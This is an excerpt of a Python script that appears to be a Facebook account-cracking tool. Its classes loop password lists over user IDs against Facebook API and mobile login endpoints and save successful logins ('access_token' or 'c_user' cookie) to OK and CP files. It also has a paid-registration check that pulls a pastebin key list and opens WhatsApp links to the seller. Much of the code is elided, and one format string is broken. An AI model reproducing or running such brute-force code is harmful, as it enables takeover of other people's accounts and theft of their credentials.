...
def readline___Public_Xml():
            ...
            print("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;97m [3] Double Cutter ")
            print("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;97m [4] File Slice ")
...
def qsbuy():
    ...
    try:
        ...
        bt = ('https://pastebin.com/raw/qjp8kJ26')
    ...
    if to in r:
        ...
        os.system('am start https://wa.me/+923333404877?text=' + tks)
...
def qsreg():
    ...
    id = str(uuid.uuid1(uuid.getnode(),0))[24:].upper() + "~I-MALIK=="
    ...
    os.system('am start https://wa.me/+923079321417?text=' + tks)
...
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        ...
        #MALIK_MUJAHID('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
    else:
...
class __crack__:
                ...
                if pwek == '':
                    ...
                    def _sempak_(bse=None):
                        ...
                        if boy == '':
                            ...
                            print('\n[•] Result OK saved to MALIK-OK.txt')
                            print('[•] Result CP saved to MALIK-CP.txt')
                            print('\n\tCrack Processing...\n\n');print(logo)
    ...
    def __api__(self, user, _sempak_):
        ...
        for pw in _sempak_:
            ...
            if "access_token" in p:
                print('\r\033[1;92m[MUJAHID-OK] %s | %s%s      '%(user,pw,tahun(user)))
                ...
                try:
                    ...
                    print('\r\033[1;92m[MUJAHID-OK]  %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
                    ...
                    pass
                print('\r\033[1;91m[MUJAHID-CP] %s | %s%s      '%(user,pw,tahun(user)))
                wrt = '%s - %s%s' % (user,pw,tahun(user))
                cp.append(wrt)
    ...
    def __mbasic__(self, user, _sempak_):
        ...
        for pw in _sempak_:
            ...
            if 'c_user' in ses.cookies.get_dict():
                print('\r\033[1;32m[MUJAHID-OK]  %s | %s      ' % (user,pw))
                wrt = '%s - %s' % (user,pw)
                ok.append(wrt)
                open('OK.txt','a').write('%s\n' % wrt)
                break
    ...
    def __mfb__(self, user, _sempak_):
        ...
        for pw in _sempak_:
            ...
            if 'c_user' in ses.cookies.get_dict():
                print('\r\033[1;92m[MUJAHID-OK]  %s | %s      '%(user,pw))
                wrt = '%s - %s - %s' % (user,pw)
                ok.append(wrt)
                open('OK.txt','a').write('%s\n' % wrt)
                break
